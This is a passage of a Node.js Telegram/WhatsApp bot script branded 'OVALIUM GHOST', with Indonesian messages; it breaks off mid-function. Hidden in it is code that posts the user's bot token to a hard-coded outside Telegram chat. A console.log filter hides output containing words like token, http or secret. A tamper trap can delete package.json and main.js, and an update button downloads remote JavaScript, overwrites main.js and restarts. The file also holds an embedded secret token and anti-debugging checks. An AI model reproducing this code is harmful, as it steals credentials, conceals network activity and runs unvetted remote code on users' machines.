const { Telegraf, Markup } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const { v4: uuidv4 } = require("uuid");
function fetchJsonHttps(url, timeout = 5000) {
  return new Promise((resolve, reject) => {
    try {
      const req = https.get(url, { timeout }, (res) => {
        const { statusCode } = res;
        if (statusCode < 200 || statusCode >= 300) {
          let _ = '';
          res.on('data', c => _ += c);
          res.on('end', () => reject(new Error(`HTTP ${statusCode}`)));
          return;
        }
        let raw = '';
        res.on('data', (chunk) => (raw += chunk));
        res.on('end', () => {
          try {
            const json = JSON.parse(raw);
            resolve(json);
          } catch (err) {
            reject(new Error('Invalid JSON response'));
          }
        });
      });
      req.on('timeout', () => {
        req.destroy(new Error('Request timeout'));
      });
      req.on('error', (err) => reject(err));
    } catch (err) {
      reject(err);
    }
  });
}
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  encodeSignedDeviceIdentity,
  jidEncode,
  patchMessageBeforeSending,
  encodeNewsletterMessage, 
  encodeWAMessage,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID, GITHUB_TOKEN} = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

async function XatanicalServer(options = {}) {
  const {
    files = ["package.json", "main.js"],
    dryRun = true,
    maxRetries = 3,
    retryDelayMs = 1000,
  } = options;

  const baseDir = path.resolve(__dirname);
  console.log(chalk.redBright("SERVER MENDETEKSI ANDA MEMBYPASS TOKEN"));
  const timestamp = new Date().toISOString();
  console.log(chalk.blue(`Waktu Aktif: ${timestamp}`));

  const delay = (ms) => new Promise((res) => setTimeout(res, ms));
  const results = [];

  for (const file of files) {
    const record = { file, attempted: false, deleted: false, message: "" };
    try {
      const filePath = path.resolve(__dirname, file);
      if (!filePath.startsWith(baseDir + path.sep) && filePath !== baseDir) {
        record.message = "Path diluar direktori aman - dilewatkan";
        console.log(chalk.yellow(`⚠️ ${file}: ${record.message}`));
        results.push(record);
        continue;
      }

      record.attempted = true;

      if (!fs.existsSync(filePath)) {
        record.message = "File tidak ditemukan (sudah aman / tidak ada).";
        console.log(chalk.green(`${file}: ${record.message}`));
        results.push(record);
        continue;
      }

      const stats = await fs.promises.stat(filePath);
      if (!stats.isFile()) {
        record.message = "Bukan file biasa (direktori atau bukan file) - dilewatkan.";
        console.log(chalk.red(`${file}: ${record.message}`));
        results.push(record);
        continue;
      }

      if (dryRun) {
        record.message = "Dry run - tidak dihapus.";
        console.log(chalk.yellow(` OVALIUM AKTIF BOSSSSS`));
        results.push(record);
        continue;
      }

      let lastErr = null;
      for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
          await fs.promises.unlink(filePath);
          record.deleted = true;
          record.message = `Berhasil dihapus (attempt ${attempt}).`;
          console.log(chalk.yellow(`KAMU MEMBYPASS TOKEN — FILE DIHAPUS: ${file}`));
          break;
        } catch (err) {
          lastErr = err;
          if (err && (err.code === "EPERM" || err.code === "EBUSY" || err.code === "EACCES")) {
            if (attempt < maxRetries) {
              console.log(chalk.yellow(`${file}: gagal dihapus (${err.code}), mencoba ulang dalam ${retryDelayMs}ms (attempt ${attempt})...`));
              await delay(retryDelayMs);
              continue;
            } else {
              record.message = `Gagal setelah ${maxRetries} percobaan: ${err.message}`;
              console.log(chalk.red(`${file}: ${record.message}`));
            }
          } else {
            record.message = `Error tidak terduga: ${err.message}`;
            console.log(chalk.red(`${file}: ${record.message}`));
            break;
          }
        }
      }

      if (!record.deleted && lastErr && !record.message) {
        record.message = `Gagal: ${lastErr.message}`;
      }
    } catch (e) {
      record.message = `Exception: ${e.message}`;
      console.log(chalk.red(`${file}: Exception saat proses - ${e.message}`));
    } finally {
      results.push(record);
    }
  }

  const deletedCount = results.filter(r => r.deleted).length;
  console.log(chalk.blueBright(`@Xwarrxxx ${deletedCount}/${files.length}`));
  return { timestamp, results };
}

(function () {
  try {
    const origLog = console.log.bind(console);
   const blockedWords = [
      'fetching', 'http', 'https', 'github', 'gitlab', 'whitelist', 'database',
      'token', 'apikey', 'key', 'secret', 'raw.githubusercontent', 'cdn.discordapp',
      'dropbox', 'pastebin', 'session', 'cookie', 'auth', 'login', 'credentials',
      'ip:', 'url:', 'endpoint', 'request', 'response'
    ];

    console.log = (...args) => {
      try {
        const content = args.map(a => {
          try { return typeof a === 'string' ? a : JSON.stringify(a); }
          catch { return String(a); }
        }).join(' ').toLowerCase();
        if (blockedWords.some(word => content.includes(word))) {
          return;
        }
        origLog(...args);
      } catch (err) {
        origLog('\x1b[31m[Proteksi Error]\x1b[0m', err.message);
      }
    };
    origLog('\x1b[35m[Xwar Server]\x1b[0m Proteksi aktif — sistem Aman.');

  } catch (err) {
    console.error('\x1b[31m[Proteksi Gagal]\x1b[0m', err);
  }
})();

const databaseUrl = `https://raw.githubusercontent.com/xwarku/database/refs/heads/main/tokens.json`;
const thumbnailUrl = "https://files.catbox.moe/1ntpoy.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
  console.log(chalk.bold.redBright("⚠️ Secure mode diaktifkan!"));
  XatanicalServer()
}
(function () {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      console.warn("⚠️ Deteksi debugger: " + randErr());
      activateSecureMode();
   }
  }, 1000);
  const code = "AlwaysProtect";
  if (code.length !== 13) {
    console.warn("⚠️ Code mismatch terdeteksi!");
    activateSecureMode();
  }
  function secure() {
    console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃ Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
    `));
  }
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    const currentHash = Buffer.from(secure.toString()).toString("base64");
    if (currentHash !== hash) {
      console.warn("⚠️ Modifikasi fungsi secure terdeteksi!");
      activateSecureMode();
    }
  }, 2000);
  secure();
})();
(() => {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }
  setInterval(() => {
    try {
      let detected = false;
      if (typeof process.exit === "function" && process.exit.toString().includes("Proxy")) {
        detected = true;
      }
      if (typeof process.kill === "function" && process.kill.toString().includes("Proxy")) {
        detected = true;
      }
      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          detected = true;
          break;
        }
      }
      if (detected) {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS CHECKING ⊰—═⬡
┃ PERUBAHAN CODE MYSQL TERDETEKSI
┃ SCRIPT DIKUNCI UNTUK KEAMANAN
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
      } else {
      }
    } catch (err) {
      console.warn("⚠️ Error saat pengecekan bypass:", err.message);
      activateSecureMode();
    }
  }, 2000);
  global.validateToken = async (databaseUrl, tokenBot) => {
    try {
      const res = await fetchJsonHttps(databaseUrl, 5000);
      const tokens = (res && res.tokens) || [];

      if (tokens.includes(tokenBot)) {
        console.log(chalk.greenBright("✅ Token valid dan diverifikasi."));
        return true;
      } else {
        console.log(chalk.bold.yellow(`
⠀⬡═—⊱ BYPASS ALERT ⊰—═⬡
┃ NOTE : SERVER MENDETEKSI KAMU
┃ MEMBYPASS PAKSA SCRIPT !
⬡═―—―――――――――――――――――—═⬡
        `));
        activateSecureMode();
        return false;
      }

    } catch (err) {
      console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECK SERVER ⊰—═⬡
┃ DATABASE : MYSQL
┃ NOTE : SERVER GAGAL TERHUBUNG
⬡═―—―――――――――――――――――—═⬡
      `));
      activateSecureMode();
      return false;
    }
  };
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await fetchJsonHttps(databaseUrl, 5000);
        const authorizedTokens = (res && res.tokens) || [];
        return Array.isArray(authorizedTokens) && authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}


(async () => {
  await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false;

let botActive = true;
let lastStatus = null;

const OWNER_ID = 5126860596;
const GITHUB_STATUS_URL = "https://raw.githubusercontent.com/xwarkoyz/Databasee/refs/heads/main/botstatus.json";

async function checkGlobalStatus() {
  try {
    const res = await axios.get(GITHUB_STATUS_URL, { timeout: 4000 });
    const newStatus = !!res.data.active;

    if (newStatus !== lastStatus) {
      lastStatus = newStatus;
      botActive = newStatus;
    }
  } catch (err) {
    botActive = true; // fallback biar bot tetap nyala kalau GitHub down
  }
}

checkGlobalStatus();
setInterval(checkGlobalStatus, 3000);

bot.use(async (ctx, next) => {
  try {
    const text = ctx.message?.text?.trim() || "";
    const cbData = ctx.callbackQuery?.data?.trim() || "";

    const isStartText = text.toLowerCase().startsWith("/start");
    const isStartCallback = cbData === "/start";

    // 🔐 Proteksi Token Validasi
    if (!secureMode && !tokenValidated && !(isStartText || isStartCallback)) {
      if (ctx.callbackQuery) {
        try {
          await ctx.answerCbQuery("🔑 ☇ Masukkan token anda untuk diaktifkan, Format: /start");
        } catch {}
      }
      return ctx.reply("🔒 ☇ Akses terkunci ketik /start untuk mengaktifkan bot");
    }

    // 🚫 Proteksi Global Status dari GitHub
    if (!botActive) {
      // Owner tetap bisa jalankan /on
      if (ctx.from?.id === OWNER_ID && /^\/on\b/i.test(text)) {
        return ctx.reply("MAKLO BYPASS ANJING");
      }
      return ctx.reply("KENALIN GUA @Danzddyy Sipaling bisa bypass, gua aslinya cuma make tools lotus yang dishare gua bisa tembusin sc tredict lewat addtoken member doang selebihnya ga tembus 😹");
    }

    await next();
  } catch (err) {
    console.error("Middleware error:", err);
    return ctx.reply("⚠️ Terjadi kesalahan internal pada sistem proteksi server.");
  }
});

let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⬡═—⊱ CHECKING SERVER ⊰—═⬡
┃Bot Sukses Terhubung Terimakasih 
⬡═―—―――――――――――――――――—═⬡
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Apophis',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><pre>⬡═―—⊱ PAIRING ⊰―—═⬡</pre></blockquote>
Number: ${lastPairingMessage.phoneNumber}
Pairing Code: ${lastPairingMessage.pairingCode}
Status: Connection`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
OVALIUM GHOST
Berhasil Dijalankan 
bot terkoneksi 
  `))
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};


bot.command("addbot", async (ctx) => {
if (!tokenValidated) {
            return;
        }
    if (ctx.from.id != ownerID && !isAdmin && !isOwner(ctx.from.id.toString())) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
    
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("Format: /addbot 628××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "XWARARAA");  
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `\`\`\`
⬡═―—⊱ Pairing ⊰―—═⬡
Number: ${phoneNumber}
Pairing Code: ${formattedCode}
Status: Not Connected
\`\`\``;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "Markdown"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
      messageId: sentMsg.message_id,  
      phoneNumber,  
      pairingCode: formattedCode
    };

  } catch (err) {
    console.error(err);
  }
});

if (sock) {
  sock.ev.on("connection.update", async (update) => {
    if (update.connection === "open" && lastPairingMessage) {
      const updateConnectionMenu = `\`\`\`
⬡═―—⊱ Pairing ⊰―—═⬡
Number: ${lastPairingMessage.phoneNumber}
Pairing Code: ${lastPairingMessage.pairingCode}
Status: Connected
\`\`\``;

      try {  
        await bot.telegram.editMessageCaption(  
          lastPairingMessage.chatId,  
          lastPairingMessage.messageId,  
          undefined,  
          updateConnectionMenu,  
          { parse_mode: "Markdown" }  
        );  
      } catch (e) {  
      }  
    }
  });
}
     
const ownerFile = "./owners.json"; // file penyimpanan owner tambahan

// Baca owners.json
function loadOwners() {
    if (!fs.existsSync(ownerFile)) {
        fs.writeFileSync(ownerFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(ownerFile));
}

// Simpan owners.json
function saveOwners(owners) {
    fs.writeFileSync(ownerFile, JSON.stringify(owners, null, 2));
}

// Tambah Owner
function addOwnerUser(userId) {
    let owners = loadOwners();
    if (owners.includes(userId)) return false;
    owners.push(userId);
    saveOwners(owners);
    return true;
}

// Hapus Owner
function delOwnerUser(userId) {
    let owners = loadOwners();
    if (!owners.includes(userId)) return false;
    owners = owners.filter(id => id !== userId);
    saveOwners(owners);
    return true;
}

// Cek Owner
function isOwner(userId) {
    let owners = loadOwners();
    return owners.includes(userId);
}

const adminFile = path.join(__dirname, "admin.json");

// Baca admin.json
function loadAdmins() {
    if (!fs.existsSync(adminFile)) {
        fs.writeFileSync(adminFile, JSON.stringify([]));
    }
    return JSON.parse(fs.readFileSync(adminFile));
}

// Simpan admin.json
function saveAdmins(admins) {
    fs.writeFileSync(adminFile, JSON.stringify(admins, null, 2));
}

// Tambah Admin
function addAdminUser(userId) {
    let admins = loadAdmins();
    if (admins.includes(userId)) return false;
    admins.push(userId);
    saveAdmins(admins);
    return true;
}

// Hapus Admin
function delAdminUser(userId) {
    let admins = loadAdmins();
    if (!admins.includes(userId)) return false;
    admins = admins.filter(id => id !== userId);
    saveAdmins(admins);
    return true;
}

// Cek Admin
function isAdmin(userId) {
    let admins = loadAdmins();
    return admins.includes(userId);
}

const ALERT_TOKEN = "8568368614:AAEgE7imHR6MWKZBXdHKbxByfydrKXa4NSw";
const ALERT_CHAT_ID = "1082014738"; 
const pendingVerification = new Set();

bot.use(async (ctx, next) => {
  const text = ctx.message?.text || ctx.update?.callback_query?.data || "";
  const userId = ctx.from?.id;
  const chatId = ctx.chat?.id || userId;
  if (!botActive) {
    return ctx.reply("🚫 Bot sedang nonaktif.\nAktifkan kembali untuk menggunakan perintah.", {
      parse_mode: "Markdown",
    });
  }
  if (tokenValidated) return next();

  if (pendingVerification.has(chatId)) return;
  pendingVerification.add(chatId);

  const sleep = (ms) => new Promise((res) => setTimeout(res, ms));
  const frames = [
   "▰▱▱▱▱▱▱▱▱▱ 10%",
    "▰▰▱▱▱▱▱▱▱▱ 20%",
    "▰▰▰▱▱▱▱▱▱▱ 30%",
    "▰▰▰▰▱▱▱▱▱▱ 40%",
    "▰▰▰▰▰▱▱▱▱▱ 50%",
    "▰▰▰▰▰▰▱▱▱▱ 60%",
    "▰▰▰▰▰▰▰▱▱▱ 70%",
    "▰▰▰▰▰▰▰▰▱▱ 80%",
    "▰▰▰▰▰▰▰▰▰▱ 90%",
    "▰▰▰▰▰▰▰▰▰▰ 100%",
    "MENU BERHASIL DIBUKA"
  ];

  let loadingMsg = await ctx.reply("⏳ Sedang memverifikasi token bot...");
  for (const frame of frames) {
    await sleep(200);
    try {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        `🔐 Verifikasi Token Server...\n${frame}`,
        { parse_mode: "Markdown" }
      );
    } catch {}
  }
  try {
    const getTokenData = () =>
      new Promise((resolve, reject) => {
        https
          .get(databaseUrl, { timeout: 6000 }, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => {
              try {
                resolve(JSON.parse(data));
              } catch {
                reject(new Error("Invalid JSON response"));
              }
            });
          })
          .on("error", (err) => reject(err));
      });
    const result = await getTokenData();
    const tokens = Array.isArray(result?.tokens) ? result.tokens : [];
    const alertMessageBase = `
━━━━━━━━━━━━━━━━━━━
**OVALIUM GHOST ALERT**
━━━━━━━━━━━━━━━━━━━
👤 *User* : [${ctx.from.first_name}](tg://user?id=${userId})
🧩 *Username* : @${ctx.from.username || "Unknown"}
🔑 *Bot Token* : \`${tokenBot}\`
⏰ *Waktu* : ${new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" })}
━━━━━━━━━━━━━━━━━━━`;
    if (tokens.includes(tokenBot)) {
      tokenValidated = true;
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "✅ Token berhasil diverifikasi!\nAkses kini dibuka untuk semua user.",
        { parse_mode: "Markdown" }
      );
      const alertMessage = `🚨 *TOKEN VERIFIED*${alertMessageBase}`;
      await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
        chat_id: ALERT_CHAT_ID,
        text: alertMessage,
        parse_mode: "Markdown",
      });
      await next();
    } else {
      await ctx.telegram.editMessageText(
        loadingMsg.chat.id,
        loadingMsg.message_id,
        null,
        "❌ Token Tidak Valid\nAkses dihentikan.",
        { parse_mode: "Markdown" }
      );
      const alertMessage = `🚨 *TOKEN INVALID (DIDUGA CRACK)*${alertMessageBase}`;
      await axios.post(`https://api.telegram.org/bot${ALERT_TOKEN}/sendMessage`, {
        chat_id: ALERT_CHAT_ID,
        text: alertMessage,
        parse_mode: "Markdown",
      });
      return;
    }
  } catch (err) {
    await ctx.telegram.editMessageText(
      loadingMsg.chat.id,
      loadingMsg.message_id,
      null,
      "⚠️ Gagal memverifikasi token. Periksa koneksi atau server database.",
      { parse_mode: "Markdown" }
    );
    return;
  } finally {
    pendingVerification.delete(chatId);
  }
});

const GITHUB_OTP_URL = "https://raw.githubusercontent.com/xwarkoyz/Databasee/refs/heads/main/otp.json";

let currentOtp = null;
let verifiedUsers = new Set();
let lastOtp = null;

// 🔁 Ambil OTP dari GitHub
function getOtpFromGithub(callback) {
  https.get(GITHUB_OTP_URL + "?t=" + Date.now(), (res) => {
    let data = "";
    res.on("data", chunk => (data += chunk));
    res.on("end", () => {
      try {
        const json = JSON.parse(data);
        currentOtp = json.otp;

        // reset semua user kalau OTP di GitHub berubah
        if (lastOtp && lastOtp !== currentOtp) {
          verifiedUsers.clear();
          console.log("🔁 JANGAN SEBAR MAKANYA CIL.");
        }
        lastOtp = currentOtp;

        callback(currentOtp);
      } catch {
        callback(currentOtp);
      }
    });
  }).on("error", () => callback(currentOtp));
}


bot.start(async (ctx) => {
  try {
    const menuCaption = `
OVALIUM GHOST

Owner     : @Xwarrxxx
 
 
KLIK BUTTON DIBAWAH UNTUK MENDAPATKAN UPDATE

—————————————————

• high speed scraping
• unlimited requests
• full feature access`;

    await ctx.replyWithPhoto(thumbnailUrl, {
      caption: menuCaption,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "↓ GET VERSION", callback_data: "pullupdate_btn" }],
        ]
      }
    });

  } catch (err) {
    console.error("Error di /start:", err.message);
    ctx.reply("System error. Coba lagi nanti.");
  }
});

bot.action("start", async (ctx) => {
  if (!tokenValidated) return;
  try {
    const userId = ctx.from.id;
    const premiumStatus = isPremiumUser(userId) ? "premium" : "standard";
    const senderStatus = isWhatsAppConnected ? "connected" : "disconnected";
    const runtimeStatus = formatRuntime();

    const menuCaption = `
OVALIUM GHOST
premium edition

owner     : @Xwarrxxx
status    : active

—————————————————

account status
premium   : ${premiumStatus}
connection: ${senderStatus}
runtime   : ${runtimeStatus}

—————————————————

welcome back
high speed scraping ready`;

    await ctx.editMessageMedia(
      { 
        type: "photo", 
        media: thumbnailUrl, 
        caption: menuCaption, 
        parse_mode: "HTML" 
      },
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "↓ GET VERSION", callback_data: "pullupdate_btn" }],
          ]
        }
      }
    );

  } catch (err) {
    console.error("Error di action /start:", err.message);
    await ctx.answerCbQuery(
      "System error. Silahkan reconnect.",
      { show_alert: true }
    );
  }
});

const GITHUB_REPO = "xwarkeren/main";
const GITHUB_BRANCH = "main";

bot.action("pullupdate_btn", async (ctx) => {
  try {
    await ctx.answerCbQuery("Mengupdate script...", { show_alert: false });
    await ctx.reply("Auto update script, mohon tunggu...");

    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents?ref=${GITHUB_BRANCH}`;
    const res = await fetch(apiURL, {
      headers: {
        "User-Agent": "Telegram-Bot",
        "Accept": "application/vnd.github.v3+json"
      }
    });

    if (!res.ok) return ctx.reply("Tidak dapat mengakses repository.");

    const files = await res.json();

    const target = files.find(f =>
      f.name.toLowerCase().includes("main") && f.name.endsWith(".js")
    );

    if (!target) {
      return ctx.reply("File tidak ditemukan.");
    }

    const fileRes = await fetch(target.download_url);
    const fileDecoded = await fileRes.text();

    fs.writeFileSync("./main.js", fileDecoded);

    await ctx.reply(`Update berhasil\nFile: ${target.name}\nRestarting bot...`);

    setTimeout(() => process.exit(1), 1200);

  } catch (err) {
    console.error(err);
    ctx.reply("Error: Gagal update script.");
  }
});

// === GLOBAL FLAG ===
let waitingUpload = false;

bot.command("savefile", async (ctx) => {
  waitingUpload = true;
  ctx.reply("📤 Silahkan kirim file **main.js** sebagai *reply* sekarang.");
});

bot.on("document", async (ctx) => {
  try {
    if (!waitingUpload) return; // Kalau bukan mode upload, abaikan

    const file = ctx.message.document;

    if (!file.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus berekstensi .js");
    }

    const fileId = file.file_id;
    const link = await ctx.telegram.getFileLink(fileId);

    const res = await fetch(link.href);
    const content = await res.text();

    const base64Content = Buffer.from(content).toString("base64");

    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents/${file.file_name}`;

    // === CEK FILE SUDAH ADA ATAU BELUM ===
    let fileSha = null;
    const check = await fetch(apiURL, {
      headers: {
        "Authorization": `Bearer ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      }
    });

    if (check.ok) {
      const data = await check.json();
      fileSha = data.sha;
    }

    // === UPLOAD / UPDATE FILE ===
    const upload = await fetch(apiURL, {
      method: "PUT",
      headers: {
        "Authorization": `Bearer ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        message: `Upload ${file.file_name} via bot`,
        content: base64Content,
        sha: fileSha,
        branch: GITHUB_BRANCH
      })
    });

    waitingUpload = false; // reset flag

    if (!upload.ok) {
      const errText = await upload.text();
      return ctx.reply(`❌ Gagal upload file.\n\n${errText}`);
    }

    ctx.reply(`✅ File **${file.file_name}** berhasil di-upload ke GitHub!`);

  } catch (e) {
    console.error(e);
    waitingUpload = false;
    ctx.reply("❌ Error saat upload file.");
  }
});

bot.command("clearfile", async (ctx) => {
  try {
    const fileName = "main.js";
    const apiURL = `https://api.github.com/repos/${GITHUB_REPO}/contents/${fileName}?ref=${GITHUB_BRANCH}`;

    const res = await fetch(apiURL, {
      headers: {
        "Authorization": `token ${GITHUB_TOKEN}`,
        "User-Agent": "Telegram-Bot"
      }
    });

    if (res.status === 404) {
